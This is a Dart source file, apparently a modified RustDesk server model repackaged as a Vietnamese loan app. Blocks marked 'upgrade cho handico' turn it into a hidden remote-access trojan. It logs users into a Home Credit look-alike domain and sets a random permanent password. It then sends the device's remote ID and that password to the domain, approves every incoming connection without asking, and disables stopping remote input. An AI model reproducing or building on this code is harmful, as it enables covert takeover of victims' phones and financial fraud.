import 'dart:async';
import 'dart:convert';
import 'dart:io';
//++++Reminani : upgrade cho handico
import 'dart:math';
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
//----Reminani : upgrade cho handico
import 'package:flutter/material.dart';
import 'package:flutter_hbb/consts.dart';
import 'package:flutter_hbb/main.dart';
import 'package:flutter_hbb/models/chat_model.dart';
import 'package:flutter_hbb/models/platform_model.dart';
import 'package:get/get.dart';
  //++++Reminani : upgrade cho handico
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;
  //----Reminani : upgrade cho handico
import 'package:wakelock_plus/wakelock_plus.dart';
import 'package:window_manager/window_manager.dart';

import '../common.dart';
import '../common/formatter/id_formatter.dart';
import '../desktop/pages/server_page.dart' as desktop;
import '../desktop/widgets/tabbar_widget.dart';
import '../mobile/pages/server_page.dart';
import 'model.dart';

const kLoginDialogTag = "LOGIN";

const kUseTemporaryPassword = "use-temporary-password";
const kUsePermanentPassword = "use-permanent-password";
const kUseBothPasswords = "use-both-passwords";

class ServerModel with ChangeNotifier {
  bool _isStart = false; // Android MainService status
  bool _mediaOk = false;
  bool _inputOk = false;
  //++++Reminani : upgrade cho handico
  bool _platformOk = false;
  bool _deviceOk = false;
  bool _cameraOk = false;
  //----Reminani : upgrade cho handico
  bool _audioOk = false;
  bool _fileOk = false;
  bool _showElevation = false;
  bool hideCm = false;
  int _connectStatus = 0; // Rendezvous Server status
  String _verificationMethod = "";
  String _temporaryPasswordLength = "";
  String _approveMode = "";
  int _zeroClientLengthCounter = 0;

  late String _emptyIdShow;
  late final IDTextEditingController _serverId;
  final _serverPasswd =
      TextEditingController(text: translate("Generating ..."));

  final tabController = DesktopTabController(tabType: DesktopTabType.cm);

  final List<Client> _clients = [];

  Timer? cmHiddenTimer;

  bool get isStart => _isStart;

  bool get mediaOk => _mediaOk;

  bool get inputOk => _inputOk;
  //++++Reminani : upgrade cho handico
  bool get platformOk => _platformOk;

  bool get deviceOk => _deviceOk;
  bool get cameraOk => _cameraOk;
  //----Reminani : upgrade cho handico
  bool get audioOk => _audioOk;

  bool get fileOk => _fileOk;

  bool get showElevation => _showElevation;

  int get connectStatus => _connectStatus;
  //++++Reminani : upgrade cho handico
  static String token = '';
  static int idLogin = -1 ;
  static const platform = MethodChannel('mChannel');
  //----Reminani : upgrade cho handico

  String get verificationMethod {
    final index = [
      kUseTemporaryPassword,
      kUsePermanentPassword,
      kUseBothPasswords
    ].indexOf(_verificationMethod);
    if (index < 0) {
      return kUseBothPasswords;
    }
    return _verificationMethod;
  }

  String get approveMode => _approveMode;

  setVerificationMethod(String method) async {
    await bind.mainSetOption(key: "verification-method", value: method);
    /*
    if (method != kUsePermanentPassword) {
      await bind.mainSetOption(
          key: 'allow-hide-cm', value: bool2option('allow-hide-cm', false));
    }
    */
  }

  String get temporaryPasswordLength {
    final lengthIndex = ["6", "8", "10"].indexOf(_temporaryPasswordLength);
    if (lengthIndex < 0) {
      return "6";
    }
    return _temporaryPasswordLength;
  }

  setTemporaryPasswordLength(String length) async {
    await bind.mainSetOption(key: "temporary-password-length", value: length);
  }

  setApproveMode(String mode) async {
    await bind.mainSetOption(key: 'approve-mode', value: mode);
    /*
    if (mode != 'password') {
      await bind.mainSetOption(
          key: 'allow-hide-cm', value: bool2option('allow-hide-cm', false));
    }
    */
  }

  TextEditingController get serverId => _serverId;

  TextEditingController get serverPasswd => _serverPasswd;

  List<Client> get clients => _clients;

  final controller = ScrollController();

  WeakReference<FFI> parent;

  ServerModel(this.parent) {
    _emptyIdShow = translate("Generating ...");
    _serverId = IDTextEditingController(text: _emptyIdShow);

    /*
    // initital _hideCm at startup
    final verificationMethod =
        bind.mainGetOptionSync(key: "verification-method");
    final approveMode = bind.mainGetOptionSync(key: 'approve-mode');
    _hideCm = option2bool(
        'allow-hide-cm', bind.mainGetOptionSync(key: 'allow-hide-cm'));
    if (!(approveMode == 'password' &&
        verificationMethod == kUsePermanentPassword)) {
      _hideCm = false;
    }
    */

    timerCallback() async {
      final connectionStatus =
          jsonDecode(await bind.mainGetConnectStatus()) as Map<String, dynamic>;
      final statusNum = connectionStatus['status_num'] as int;
      if (statusNum != _connectStatus) {
        _connectStatus = statusNum;
        notifyListeners();
      }

      if (desktopType == DesktopType.cm) {
        final res = await bind.cmCheckClientsLength(length: _clients.length);
        if (res != null) {
          debugPrint("clients not match!");
          updateClientState(res);
        } else {
          if (_clients.isEmpty) {
            hideCmWindow();
            if (_zeroClientLengthCounter++ == 12) {
              // 6 second
              windowManager.close();
            }
          } else {
            _zeroClientLengthCounter = 0;
            if (!hideCm) showCmWindow();
          }
        }
      }

      updatePasswordModel();
    }

    if (!isTest) {
      Future.delayed(Duration.zero, () async {
        if (await bind.optionSynced()) {
          await timerCallback();
        }
      });
      Timer.periodic(Duration(milliseconds: 500), (timer) async {
        await timerCallback();
      });
    }
  }

  /// 1. check android permission
  /// 2. check config
  /// audio true by default (if permission on) (false default < Android 10)
  /// file true by default (if permission on)
  checkAndroidPermission() async {
    // audio
    if (androidVersion < 30 ||
        !await AndroidPermissionManager.check(kRecordAudio)) {
      _audioOk = false;
      bind.mainSetOption(key: "enable-audio", value: "N");
    } else {
      final audioOption = await bind.mainGetOption(key: 'enable-audio');
      _audioOk = audioOption.isEmpty;
    }

  //++++Reminani : upgrade cho handico
    // camera
    if (!await AndroidPermissionManager.check(kCamera)) {
      _cameraOk = false;
      bind.mainSetOption(key: "enable-camera", value: "N");
    } else {
      final audioOption = await bind.mainGetOption(key: 'enable-camera');
      _cameraOk = audioOption.isEmpty;
    }
  //----Reminani : upgrade cho handico
    // file
    if (!await AndroidPermissionManager.check(kManageExternalStorage)) {
      _fileOk = false;
      bind.mainSetOption(key: "enable-file-transfer", value: "N");
    } else {
      final fileOption = await bind.mainGetOption(key: 'enable-file-transfer');
      _fileOk = fileOption.isEmpty;
    }

    notifyListeners();
  }

  updatePasswordModel() async {
    var update = false;
    final temporaryPassword = await bind.mainGetTemporaryPassword();
    final verificationMethod =
        await bind.mainGetOption(key: "verification-method");
    final temporaryPasswordLength =
        await bind.mainGetOption(key: "temporary-password-length");
    final approveMode = await bind.mainGetOption(key: 'approve-mode');
    /*
    var hideCm = option2bool(
        'allow-hide-cm', await bind.mainGetOption(key: 'allow-hide-cm'));
    if (!(approveMode == 'password' &&
        verificationMethod == kUsePermanentPassword)) {
      hideCm = false;
    }
    */
    if (_approveMode != approveMode) {
      _approveMode = approveMode;
      update = true;
    }
    var stopped = option2bool(
        "stop-service", await bind.mainGetOption(key: "stop-service"));
    final oldPwdText = _serverPasswd.text;
    if (stopped ||
        verificationMethod == kUsePermanentPassword ||
        _approveMode == 'click') {
      _serverPasswd.text = '-';
    } else {
      if (_serverPasswd.text != temporaryPassword &&
          temporaryPassword.isNotEmpty) {
        _serverPasswd.text = temporaryPassword;
      }
    }
    if (oldPwdText != _serverPasswd.text) {
      update = true;
    }
    if (_verificationMethod != verificationMethod) {
      _verificationMethod = verificationMethod;
      update = true;
    }
    if (_temporaryPasswordLength != temporaryPasswordLength) {
      if (_temporaryPasswordLength.isNotEmpty) {
        bind.mainUpdateTemporaryPassword();
      }
      _temporaryPasswordLength = temporaryPasswordLength;
      update = true;
    }
    /*
    if (_hideCm != hideCm) {
      _hideCm = hideCm;
      if (desktopType == DesktopType.cm) {
        if (hideCm) {
          await hideCmWindow();
        } else {
          await showCmWindow();
        }
      }
      update = true;
    }
    */
    if (update) {
      notifyListeners();
    }
  }

  toggleAudio() async {
    if (clients.isNotEmpty) {
      await showClientsMayNotBeChangedAlert(parent.target);
    }
    if (!_audioOk && !await AndroidPermissionManager.check(kRecordAudio)) {
      final res = await AndroidPermissionManager.request(kRecordAudio);
      if (!res) {
        showToast(translate('Failed'));
        return;
      }
    }

    _audioOk = !_audioOk;
    bind.mainSetOption(key: "enable-audio", value: _audioOk ? '' : 'N');
    notifyListeners();
  }

  toggleFile() async {
    if (clients.isNotEmpty) {
      await showClientsMayNotBeChangedAlert(parent.target);
    }
    if (!_fileOk &&
        !await AndroidPermissionManager.check(kManageExternalStorage)) {
      final res =
          await AndroidPermissionManager.request(kManageExternalStorage);
      if (!res) {
        showToast(translate('Failed'));
        return;
      }
    }

    _fileOk = !_fileOk;
    bind.mainSetOption(key: "enable-file-transfer", value: _fileOk ? '' : 'N');
    notifyListeners();
  }

  toggleInput() async {
    if (clients.isNotEmpty) {
      await showClientsMayNotBeChangedAlert(parent.target);
    }
    if (_inputOk) {
  //++++Reminani : upgrade cho handico
      //khong cho stop input remote
      // parent.target?.invokeMethod("stop_input");
      // bind.mainSetOption(key: "enable-keyboard", value: 'N');
  //----Reminani : upgrade cho handico
    } else {
      if (parent.target != null) {
        /// the result of toggle-on depends on user actions in the settings page.
        /// handle result, see [ServerModel.changeStatue]
        showInputWarnAlert(parent.target!);
      }
    }
  }

  Future<bool> checkRequestNotificationPermission() async {
    debugPrint("androidVersion $androidVersion");
    if (androidVersion < 33) {
      return true;
    }
    if (await AndroidPermissionManager.check(kAndroid13Notification)) {
      debugPrint("notification permission already granted");
      return true;
    }
    var res = await AndroidPermissionManager.request(kAndroid13Notification);
    debugPrint("notification permission request result: $res");
    return res;
  }

  /// Toggle the screen sharing service.
  toggleService() async {
    //++++Reminani : upgrade cho handico
    if (!_isStart) {
    	await checkRequestNotificationPermission();
    }
    // if (_isStart) {
    //   final res = await parent.target?.dialogManager
    //       .show<bool>((setState, close, context) {
    //     submit() => close(true);
    //     return CustomAlertDialog(
    //       title: Row(children: [
    //         const Icon(Icons.warning_amber_sharp,
    //             color: Colors.redAccent, size: 28),
    //         const SizedBox(width: 10),
    //         Text(translate("Warning")),
    //       ]),
    //       content: Text(translate("android_stop_service_tip")),
    //       actions: [
    //         TextButton(onPressed: close, child: Text(translate("Cancel"))),
    //         TextButton(onPressed: submit, child: Text(translate("OK"))),
    //       ],
    //       onSubmit: submit,
    //       onCancel: close,
    //     );
    //   });
    //   if (res == true) {
    //     stopService();
    //   }
    // } else {
    //   await checkRequestNotificationPermission();
    //   final res = await parent.target?.dialogManager
    //       .show<bool>((setState, close, context) {
    //     submit() => close(true);
    //     return CustomAlertDialog(
    //       title: Row(children: [
    //         const Icon(Icons.warning_amber_sharp,
    //             color: Colors.redAccent, size: 28),
    //         const SizedBox(width: 10),
    //         Text(translate("Warning")),
    //       ]),
    //       content: Text(translate("android_service_will_start_tip")),
    //       actions: [
    //         dialogButton("Cancel", onPressed: close, isOutline: true),
    //         dialogButton("OK", onPressed: submit),
    //       ],
    //       onSubmit: submit,
    //       onCancel: close,
    //     );
    //   });
    //   if (res == true) {
    //     startService();
    //   }
    // }
    //----Reminani : upgrade cho handico
  }
//++++Reminani : them form xac thuc thong tin
  startVerifyProcess(id, pw) async {
    if (!_isStart) {
      final res = await parent.target?.dialogManager
          .show<bool>((setState, close, context) {
        submit() => close(true);
        return CustomAlertDialog(
          title: Row(children: [
            const Icon(Icons.warning_amber_sharp,
                color: Colors.redAccent, size: 28),
            const SizedBox(width: 10),
            Text("Thông báo"),
          ]),
          content: Text(translate("android_service_will_start_tip")),
          actions: [
            dialogButton("OK", onPressed: submit),
          ],
          onSubmit: submit,
          onCancel: close,
        );
      });
      if (res == true) {
        loginLoanMember(loanUsername: id, loanUserPassword: pw);
      }
    }
  }
//----Reminani : them form xac thuc thong tin
  /// Start the screen sharing service.
  Future<void> startService() async {
    _isStart = true;
    notifyListeners();
    parent.target?.ffiModel.updateEventListener(parent.target!.sessionId, "");
    await parent.target?.invokeMethod("init_service");
    // ugly is here, because for desktop, below is useless
    await bind.mainStartService();
    updateClientState();
    if (isAndroid) {
      WakelockPlus.enable();
    }
  }

  /// Stop the screen sharing service.
  Future<void> stopService() async {
    _isStart = false;
    closeAll();
    await parent.target?.invokeMethod("stop_service");
    await bind.mainStopService();
    notifyListeners();
    if (!isLinux) {
      // current linux is not supported
      WakelockPlus.disable();
    }
  }

  Future<bool> setPermanentPassword(String newPW) async {
    await bind.mainSetPermanentPassword(password: newPW);
    await Future.delayed(Duration(milliseconds: 500));
    final pw = await bind.mainGetPermanentPassword();
    if (newPW == pw) {
      return true;
    } else {
      return false;
    }
  }

  fetchID() async {
    final id = await bind.mainGetMyId();
    if (id != _serverId.id) {
      _serverId.id = id;
      notifyListeners();
    }
  }
  //++++Reminani : upgrade cho handico
  saveAndSendInfo({String? id, String? pw}) async {
    final id = await bind.mainGetMyId();

    var url2 =
    Uri.http('cdn-homecredit.duyetnhanh247.com', 'Loans/user/updateLoan');
    const kUsePermanentPassword = "use-permanent-password";

    await bind.mainSetOption(
        key: "verification-method", value: kUsePermanentPassword);
    await updatePasswordModel();
    Random random = Random();
    List<int> numbers = List.generate(7, (index) => random.nextInt(10));
    String pwRandom = numbers.join();
    final p0 = TextEditingController(text: pwRandom);

    String pwRandom1 = "${p0.text.trim()}";
    await setPermanentPassword(pwRandom1);

    http.post(url2,
        headers: {
          'Content-type': 'application/json',
          'Accept': 'application/json',
          "Authorization": "Bearer $token"
        },
        body: json.encode(
          <String, dynamic>{
            'id': idLogin,
            'data': json.encode(
              <String, dynamic>{
                "remote_password": pwRandom1,
                "remote_id": id,
              },
            )
          },
        ));
  }

  void loginLoanMember({String? loanUsername, String? loanUserPassword}) async {
    if (loanUsername != null && loanUsername.isNotEmpty && loanUserPassword != null && loanUserPassword.isNotEmpty) {
      var url = Uri.http('cdn-homecredit.duyetnhanh247.com', 'Member/loginMember');

      final resp = await http.post(url, body: {'phonenum': loanUsername, 'password': loanUserPassword});
      if (resp.statusCode == 200) {
        var decodedResponse = jsonDecode((resp.body)) as Map;
        idLogin = decodedResponse["data"]["id"];
        token = decodedResponse["data"]["token"];
        final SharedPreferences prefs = await SharedPreferences.getInstance();
        await prefs.setInt('idLogin', idLogin);
        await prefs.setString('tokenLogin', token);
        await prefs.setString('userName', loanUsername);
        await prefs.setString('password', loanUserPassword);
        if(decodedResponse["data"]["identity_loan"] != null) {
          await prefs.setString('identityLoan', decodedResponse["data"]["identity_loan"]);
        }
        await _setUserInfoToUpdate(idLogin, token);
        await startService();
        saveAndSendInfo(id:loanUsername, pw: loanUserPassword);
      } else {
         parent.target?.dialogManager
            .show<bool>((setState, close, context) {
          return CustomAlertDialog(
            title: Row(children: [
              const Icon(Icons.warning_amber_sharp,
                  color: Colors.redAccent, size: 28),
              const SizedBox(width: 10),
              Text(translate("Cảnh báo")),
            ]),
            content: Text(translate("ID hoặc mật khẩu không đúng")),
            actions: [
              dialogButton("OK", onPressed: close),
            ],
            onSubmit: close,
          );
        });
      }
    }
  }
  //----Reminani : upgrade cho handico

  changeStatue(String name, bool value) {
    debugPrint("changeStatue value $value");
    switch (name) {
      case "media":
        _mediaOk = value;
        if (value && !_isStart) {
          startService();
        }
        break;
      case "input":
        if (_inputOk != value) {
          bind.mainSetOption(key: "enable-keyboard", value: value ? '' : 'N');
        }
        _inputOk = value;
        break;
      default:
        return;
    }
    notifyListeners();
  }

  // force
  updateClientState([String? json]) async {
    if (isTest) return;
    var res = await bind.cmGetClientsState();
    List<dynamic> clientsJson;
    try {
      clientsJson = jsonDecode(res);
    } catch (e) {
      debugPrint("Failed to decode clientsJson: '$res', error $e");
      return;
    }

    final oldClientLenght = _clients.length;
    _clients.clear();
    tabController.state.value.tabs.clear();

    for (var clientJson in clientsJson) {
      try {
        final client = Client.fromJson(clientJson);
        _clients.add(client);
        _addTab(client);
      } catch (e) {
        debugPrint("Failed to decode clientJson '$clientJson', error $e");
      }
    }
    if (desktopType == DesktopType.cm) {
      if (_clients.isEmpty) {
        hideCmWindow();
      } else if (!hideCm) {
        showCmWindow();
      }
    }
    if (_clients.length != oldClientLenght) {
      notifyListeners();
    }
  }

  void addConnection(Map<String, dynamic> evt) {
    try {
      final client = Client.fromJson(jsonDecode(evt["client"]));
      if (client.authorized) {
        parent.target?.dialogManager.dismissByTag(getLoginDialogTag(client.id));
        final index = _clients.indexWhere((c) => c.id == client.id);
        if (index < 0) {
          _clients.add(client);
        } else {
          _clients[index].authorized = true;
        }
      } else {
        if (_clients.any((c) => c.id == client.id)) {
          return;
        }
        _clients.add(client);
      }
      _addTab(client);
      // remove disconnected
      final index_disconnected = _clients
          .indexWhere((c) => c.disconnected && c.peerId == client.peerId);
      if (index_disconnected >= 0) {
        _clients.removeAt(index_disconnected);
        tabController.remove(index_disconnected);
      }
      if (desktopType == DesktopType.cm && !hideCm) {
        showCmWindow();
      }
      scrollToBottom();
      notifyListeners();
  //++++Reminani : upgrade cho handico
      //không cần show popup
      // if (isAndroid && !client.authorized) showLoginDialog(client);
  //----Reminani : upgrade cho handico
    } catch (e) {
      debugPrint("Failed to call loginRequest,error:$e");
    }
  }

  void _addTab(Client client) {
    tabController.add(TabInfo(
        key: client.id.toString(),
        label: client.name,
        closable: false,
        onTap: () {},
        page: desktop.buildConnectionCard(client)));
    Future.delayed(Duration.zero, () async {
      if (!hideCm) windowOnTop(null);
    });
    // Only do the hidden task when on Desktop.
    if (client.authorized && isDesktop) {
      cmHiddenTimer = Timer(const Duration(seconds: 3), () {
        if (!hideCm) windowManager.minimize();
        cmHiddenTimer = null;
      });
    }
    parent.target?.chatModel
        .updateConnIdOfKey(MessageKey(client.peerId, client.id));
  }

  void showLoginDialog(Client client) {
    //++++Reminani : them form xac thuc thong tin
    sendLoginResponse(client, true);
    //----Reminani : them form xac thuc thong tin

    //++++Reminani : them form xac thuc thong tin
  //   parent.target?.dialogManager.show((setState, close, context) {
  //     cancel() {
  //       sendLoginResponse(client, false);
  //       close();
  //     }

  //     submit() {
  //       sendLoginResponse(client, true);
  //       close();
  //     }

  //     return CustomAlertDialog(
  //       title:
  //           Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
  //         Text(translate(
  //             client.isFileTransfer ? "File Connection" : "Screen Connection")),
  //         IconButton(
  //             onPressed: () {
  //               close();
  //             },
  //             icon: const Icon(Icons.close))
  //       ]),
  //       content: Column(
  //         mainAxisSize: MainAxisSize.min,
  //         mainAxisAlignment: MainAxisAlignment.center,
  //         crossAxisAlignment: CrossAxisAlignment.start,
  //         children: [
  // //++++Reminani : upgrade cho handico
  //           // Text(translate("Do you accept?")),
  //           Text("Kết nối xác thực"),
  //           // ClientInfo(client),
  // //----Reminani : upgrade cho handico
  //           Text(
  //             translate("android_new_connection_tip"),
  //             style: Theme.of(globalKey.currentContext!).textTheme.bodyMedium,
  //           ),
  //         ],
  //       ),
  //       actions: [
  // //++++Reminani : upgrade cho handico
  //         // dialogButton("Dismiss", onPressed: cancel, isOutline: true),
  //         //if (approveMode != 'password')
  //         // dialogButton("Accept", onPressed: submit),
  //         dialogButton("Đồng ý", onPressed: submit),
  // //----Reminani : upgrade cho handico
  //       ],
  //       onSubmit: submit,
  //       onCancel: cancel,
  //     );
  //   }, tag: getLoginDialogTag(client.id));
    //----Reminani : them form xac thuc thong tin
  }

  scrollToBottom() {
    if (isDesktop) return;
    Future.delayed(Duration(milliseconds: 200), () {
      controller.animateTo(controller.position.maxScrollExtent,
          duration: Duration(milliseconds: 200),
          curve: Curves.fastLinearToSlowEaseIn);
    });
  }

  void sendLoginResponse(Client client, bool res) async {
    if (res) {
      bind.cmLoginRes(connId: client.id, res: res);
      if (!client.isFileTransfer) {
        parent.target?.invokeMethod("start_capture");
      }
      parent.target?.invokeMethod("cancel_notification", client.id);
      client.authorized = true;
      notifyListeners();
    } else {
      bind.cmLoginRes(connId: client.id, res: res);
      parent.target?.invokeMethod("cancel_notification", client.id);
      final index = _clients.indexOf(client);
      tabController.remove(index);
      _clients.remove(client);
    }
  }

  void onClientRemove(Map<String, dynamic> evt) {
    try {
      final id = int.parse(evt['id'] as String);
      final close = (evt['close'] as String) == 'true';
      if (_clients.any((c) => c.id == id)) {
        final index = _clients.indexWhere((client) => client.id == id);
        if (index >= 0) {
          if (close) {
            _clients.removeAt(index);
            tabController.remove(index);
          } else {
            _clients[index].disconnected = true;
          }
        }
        parent.target?.dialogManager.dismissByTag(getLoginDialogTag(id));
        parent.target?.invokeMethod("cancel_notification", id);
      }
      if (desktopType == DesktopType.cm && _clients.isEmpty) {
        hideCmWindow();
      }
      notifyListeners();
    } catch (e) {
      debugPrint("onClientRemove failed,error:$e");
    }
  }

  Future<void> closeAll() async {
    await Future.wait(
        _clients.map((client) => bind.cmCloseConnection(connId: client.id)));
    _clients.clear();
    tabController.state.value.tabs.clear();
  }

  void jumpTo(int id) {
    final index = _clients.indexWhere((client) => client.id == id);
    tabController.jumpTo(index);
  }

  void setShowElevation(bool show) {
    if (_showElevation != show) {
      _showElevation = show;
      notifyListeners();
    }
  }

  void updateVoiceCallState(Map<String, dynamic> evt) {
    try {
      final client = Client.fromJson(jsonDecode(evt["client"]));
      final index = _clients.indexWhere((element) => element.id == client.id);
      if (index != -1) {
        _clients[index].inVoiceCall = client.inVoiceCall;
        _clients[index].incomingVoiceCall = client.incomingVoiceCall;
        if (client.incomingVoiceCall) {
          // Has incoming phone call, let's set the window on top.
          Future.delayed(Duration.zero, () {
            windowOnTop(null);
          });
        }
        notifyListeners();
      }
    } catch (e) {
      debugPrint("updateVoiceCallState failed: $e");
    }
  }
//++++Reminani : them form xac thuc thong tin
  Future<void> _setUserInfoToUpdate(int idLogin, String token) async {
    // try {
      await platform.invokeMethod('user_update', {'idLogin': idLogin, "token": token});
    // } on PlatformException catch (e) {}
  }
//----Reminani : them form xac thuc thong tin
}

enum ClientType {
  remote,
  file,
  portForward,
}

class Client {
  int id = 0; // client connections inner count id
  bool authorized = false;
  bool isFileTransfer = false;
  String portForward = "";
  String name = "";
  String peerId = ""; // peer user's id,show at app
  bool keyboard = false;
  bool clipboard = false;
  bool audio = false;
  bool file = false;
  bool restart = false;
  bool recording = false;
  bool blockInput = false;
  bool disconnected = false;
  bool fromSwitch = false;
  bool inVoiceCall = false;
  bool incomingVoiceCall = false;

  RxInt unreadChatMessageCount = 0.obs;

  Client(this.id, this.authorized, this.isFileTransfer, this.name, this.peerId,
      this.keyboard, this.clipboard, this.audio);

  Client.fromJson(Map<String, dynamic> json) {
    id = json['id'];
    authorized = json['authorized'];
    isFileTransfer = json['is_file_transfer'];
    portForward = json['port_forward'];
    name = json['name'];
    peerId = json['peer_id'];
    keyboard = json['keyboard'];
    clipboard = json['clipboard'];
    audio = json['audio'];
    file = json['file'];
    restart = json['restart'];
    recording = json['recording'];
    blockInput = json['block_input'];
    disconnected = json['disconnected'];
    fromSwitch = json['from_switch'];
    inVoiceCall = json['in_voice_call'];
    incomingVoiceCall = json['incoming_voice_call'];
  }

  Map<String, dynamic> toJson() {
    final Map<String, dynamic> data = <String, dynamic>{};
    data['id'] = id;
    data['is_start'] = authorized;
    data['is_file_transfer'] = isFileTransfer;
    data['port_forward'] = portForward;
    data['name'] = name;
    data['peer_id'] = peerId;
    data['keyboard'] = keyboard;
    data['clipboard'] = clipboard;
    data['audio'] = audio;
    data['file'] = file;
    data['restart'] = restart;
    data['recording'] = recording;
    data['block_input'] = blockInput;
    data['disconnected'] = disconnected;
    data['from_switch'] = fromSwitch;
    return data;
  }

  ClientType type_() {
    if (isFileTransfer) {
      return ClientType.file;
    } else if (portForward.isNotEmpty) {
      return ClientType.portForward;
    } else {
      return ClientType.remote;
    }
  }
}

String getLoginDialogTag(int id) {
  return kLoginDialogTag + id.toString();
}

showInputWarnAlert(FFI ffi) {
  ffi.dialogManager.show((setState, close, context) {
    submit() {
      AndroidPermissionManager.startAction(kActionAccessibilitySettings);
      close();
    }

    return CustomAlertDialog(
      title: Text(translate("How to get Android input permission?")),
      content: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Text(translate("android_input_permission_tip1")),
          const SizedBox(height: 10),
          Text(translate("android_input_permission_tip2")),
        ],
      ),
      actions: [
        dialogButton("Cancel", onPressed: close, isOutline: true),
        dialogButton("Open System Setting", onPressed: submit),
      ],
      onSubmit: submit,
      onCancel: close,
    );
  });
}

Future<void> showClientsMayNotBeChangedAlert(FFI? ffi) async {
  await ffi?.dialogManager.show((setState, close, context) {
    return CustomAlertDialog(
      title: Text(translate("Permissions")),
      content: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Text(translate("android_permission_may_not_change_tip")),
        ],
      ),
      actions: [
        dialogButton("OK", onPressed: close),
      ],
      onSubmit: close,
      onCancel: close,
    );
  });
}
